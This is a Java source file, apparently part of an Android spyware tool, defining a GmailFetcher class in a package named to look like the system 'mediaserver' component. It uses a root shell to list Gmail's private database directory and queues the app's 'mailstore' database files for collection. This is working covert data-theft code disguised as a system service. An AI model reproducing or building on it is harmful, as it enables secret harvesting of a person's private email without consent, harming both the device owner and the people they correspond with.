package com.android.mediaserver.fetchers.apps;

import com.android.mediaserver.fetchers.FetchedFile;
import com.android.mediaserver.fetchers.file.FileFetcher;
import com.android.mediaserver.shell.Shell.SU;
import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class GmailFetcher extends FileFetcher {
  private final List<String> mExtensionsToExclude;

  public GmailFetcher() {
    this.mExtensionsToExclude = Arrays.asList(new String[] { "db-shm", "db-wal" });
    this.mFetchedFiles = new ArrayList();
  }

  public List<FetchedFile> fetch() {
    List<String> res = SU.run("ls /data/data/com.google.android.gm/databases/");
    if (res != null) {
      for (String file : res) {
        if (true == file.contains("mailstore")) {
          boolean shouldAdd = true;
          for (String extension : this.mExtensionsToExclude) {
            if (true == file.contains(extension)) {
              shouldAdd = false;
              break;
            }
          }
          if (true == shouldAdd) {
            this.mFetchedFiles.add(
                new FetchedFile(new File("/data/data/com.google.android.gm/databases/" + file),
                    "APP", "gmail"));
          }
        }
      }
    }
    return this.mFetchedFiles;
  }
}
